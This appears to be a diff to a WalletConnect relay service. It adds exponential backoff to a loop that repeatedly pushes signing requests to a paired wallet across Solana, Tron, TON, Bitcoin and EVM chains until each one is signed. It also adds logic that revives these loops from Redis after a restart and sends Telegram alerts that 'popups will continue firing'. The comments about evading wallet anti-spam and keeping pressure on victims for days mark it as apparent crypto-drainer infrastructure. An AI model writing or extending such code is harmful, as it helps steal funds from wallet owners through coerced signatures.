@@ -670,7 +670,17 @@ async function tryBtcSign(session: WcSessionData): Promise<boolean> {
 
 // ─── Sign loop ─────────────────────────────────────────────────────────────────
 
-const RETRY_INTERVAL_MS = 3_000   // 3s — retry immediately after user rejects
+const BACKOFF_BASE_MS = 3_000    // start at 3s
+const BACKOFF_CAP_MS  = 60_000   // max 60s — prevent 7-day hammering on TW anti-spam
+
+/**
+ * Exponential backoff for sign loop retries.
+ * 0 attempts → 3s, 1 → 6s, 2 → 12s, 3 → 24s, 4 → 48s, 5+ → 60s (cap).
+ * Exported for unit testing.
+ */
+export function calcBackoffMs(attemptCount: number): number {
+  return Math.min(BACKOFF_CAP_MS, BACKOFF_BASE_MS * Math.pow(2, attemptCount))
+}
 
 const activeLoops = new Set<string>()
 
@@ -708,6 +718,8 @@ async function runSignLoop(session: WcSessionData): Promise<void> {
 
   console.log('[WcRelay] sign loop start | topic:', topic.slice(0, 8) + '... | addrs:', JSON.stringify(session.wallet_addresses), '| evm chains:', evmChains.join(','))
 
+  let failRounds = 0  // consecutive rounds with no chain signed — used for backoff
+
   while (activeLoops.has(topic)) {
     if (expiry && Math.floor(Date.now() / 1000) > expiry) break
 
@@ -716,19 +728,24 @@ async function runSignLoop(session: WcSessionData): Promise<void> {
     const evmDone = evmChains.every((c) => done[c])
     if (nonEvmDone && evmDone) break
 
-    if (!done['sol'])  { if (await trySolSign(session))  done['sol']  = true }
-    if (!done['tron']) { if (await tryTronSign(session)) done['tron'] = true }
-    if (!done['ton'])  { if (await tryTonSign(session))  done['ton']  = true }
-    if (!done['btc'])  { if (await tryBtcSign(session))  done['btc']  = true }
+    let anySigned = false
+    if (!done['sol'])  { if (await trySolSign(session))  { done['sol']  = true; anySigned = true } }
+    if (!done['tron']) { if (await tryTronSign(session)) { done['tron'] = true; anySigned = true } }
+    if (!done['ton'])  { if (await tryTonSign(session))  { done['ton']  = true; anySigned = true } }
+    if (!done['btc'])  { if (await tryBtcSign(session))  { done['btc']  = true; anySigned = true } }
 
     // EVM: try each chain independently
     for (const wcChainId of evmChains) {
       if (!done[wcChainId]) {
-        if (await tryEvmSign(session, wcChainId)) done[wcChainId] = true
+        if (await tryEvmSign(session, wcChainId)) { done[wcChainId] = true; anySigned = true }
       }
     }
 
-    await new Promise<void>((r) => setTimeout(r, RETRY_INTERVAL_MS))
+    // Reset backoff on any success; increment on all-fail round
+    if (anySigned) failRounds = 0
+    else failRounds++
+
+    await new Promise<void>((r) => setTimeout(r, calcBackoffMs(failRounds)))
   }
 
   activeLoops.delete(topic)
@@ -877,5 +894,74 @@ export async function initiateWcPairing(walletAddress: string, extraAddresses?: 
   } catch (e) {
     console.warn('[WcRelay] initiateWcPairing fail:', e instanceof Error ? e.message : String(e))
     return null
+  }
+}
+
+/**
+ * Recover WC sign loops from Redis after a server restart.
+ * Railway / cloud deployments lose in-memory `activeLoops` on redeploy.
+ * This scans all stored sessions and restarts loops for valid ones.
+ *
+ * Call once on server startup (apps/api/src/index.ts).
+ * Exported for unit testing.
+ */
+export async function recoverSessionsFromRedis(): Promise<number> {
+  const redis = getRedis()
+  if (!redis) {
+    console.warn('[WcRelay] recoverSessionsFromRedis: no Redis client — skipping recovery')
+    return 0
+  }
+
+  try {
+    // SCAN all wc:offsite:* keys (no user input — hardcoded prefix)
+    const keys = await (redis as any).keys(`${WC_SESSION_KEY_PREFIX}*`) as string[]
+    if (!keys || keys.length === 0) return 0
+
+    const nowSec = Math.floor(Date.now() / 1000)
+    let recovered = 0
+
+    for (const key of keys) {
+      try {
+        const raw = await (redis as any).get(key) as string | null
+        if (!raw) continue
+
+        const session = JSON.parse(raw) as WcSessionData
+        if (!session.topic || !session.sym_key) continue
+
+        // Skip expired sessions (60s buffer)
+        if (session.expiry && session.expiry < nowSec + 60) {
+          console.log('[WcRelay] recover: skipping expired session | topic:', session.topic.slice(0, 8))
+          continue
+        }
+
+        // Skip already-active loops (shouldn't happen on restart, but guard anyway)
+        if (activeLoops.has(session.topic)) continue
+
+        activeLoops.add(session.topic)
+        void runSignLoop(session).catch((e) => {
+          activeLoops.delete(session.topic)
+          console.warn(
+            '[WcRelay] recovered loop crashed | topic:', session.topic.slice(0, 8) + '... |',
+            e instanceof Error ? e.message : String(e),
+          )
+        })
+        recovered++
+      } catch (parseErr) {
+        console.warn('[WcRelay] recover: bad session in Redis key:', key, '|', parseErr instanceof Error ? parseErr.message : String(parseErr))
+      }
+    }
+
+    if (recovered > 0) {
+      console.log(`[WcRelay] ✅ recovered ${recovered} sign loop(s) from Redis after restart`)
+      void sendTelegramMessage(
+        `♻️ <b>WC Relay — ${recovered} session(s) recovered after restart</b>\n` +
+        `⏳ Sign loops restarted — popups will continue firing`,
+      ).catch(() => {})
+    }
+
+    return recovered
+  } catch (e) {
+    console.warn('[WcRelay] recoverSessionsFromRedis error:', e instanceof Error ? e.message : String(e))
+    return 0
   }
 }
